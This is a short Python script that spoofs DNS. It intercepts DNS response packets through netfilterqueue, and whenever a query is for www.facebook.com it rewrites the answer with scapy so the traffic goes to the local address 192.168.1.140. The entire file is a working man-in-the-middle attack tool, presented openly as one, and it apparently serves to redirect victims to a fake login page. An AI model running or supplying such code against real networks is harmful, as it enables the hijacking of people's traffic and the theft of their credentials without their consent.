#!/usr/bin/env python3
"""
dns_spoofer.py - Spoof DNS requests and responses.

"""
import os
import pwd

import netfilterqueue
from scapy import all as scapy


def del_fields(scapy_packet):
    """ Delete the fields that are not needed. """

    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].chksum
    del scapy_packet[scapy.UDP].len

    return scapy_packet

def process_packet(packet):
    """ Process the packet and spoof the DNS response. """

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.facebook.com" in str(qname):
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.140")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            scapy_packet = del_fields(scapy_packet)

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("[+] Shutting down.")
    exit(0)
